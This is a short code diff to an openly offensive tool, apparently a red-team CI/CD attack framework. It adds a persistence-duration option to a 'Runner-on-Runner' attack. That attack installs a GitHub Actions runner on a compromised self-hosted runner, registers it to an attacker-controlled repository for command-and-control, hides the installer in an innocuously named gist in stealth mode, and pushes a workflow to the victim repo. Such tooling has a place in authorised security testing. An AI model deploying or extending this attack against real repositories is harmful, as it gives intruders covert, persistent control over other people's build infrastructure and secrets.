@@ -765,7 +765,8 @@ class Attacker:
             delete_action: bool,
             yaml_name: str = "sh_cicd_attack",
             runner_labels: list = None,
-            stealth: bool = False):
+            stealth: bool = False,
+            persist_minutes: int = 0):
         """Runner-on-Runner attack: installs a GitHub Actions runner on a
         compromised self-hosted runner, registered to an attacker-controlled
         repo for persistent C2 via workflow_dispatch.
@@ -890,7 +891,8 @@ class Attacker:
         if stealth:
             # In stealth mode, put the RoR installer script in a gist
             ror_payload = CICDAttack.create_ror_payload(
-                reg_token, full_repo_name, runner_version
+                reg_token, full_repo_name, runner_version,
+                persist_minutes=persist_minutes
             )
             stealth_gist = attacker_api.create_gist(
                 description='config',
@@ -915,7 +917,8 @@ class Attacker:
         else:
             yaml_contents = CICDAttack.create_ror_yml(
                 reg_token, full_repo_name, runner_version, branch,
-                runner_labels=runner_labels
+                runner_labels=runner_labels,
+                persist_minutes=persist_minutes
             )
 
         Output.info("Pushing runner installation workflow to victim repo...")
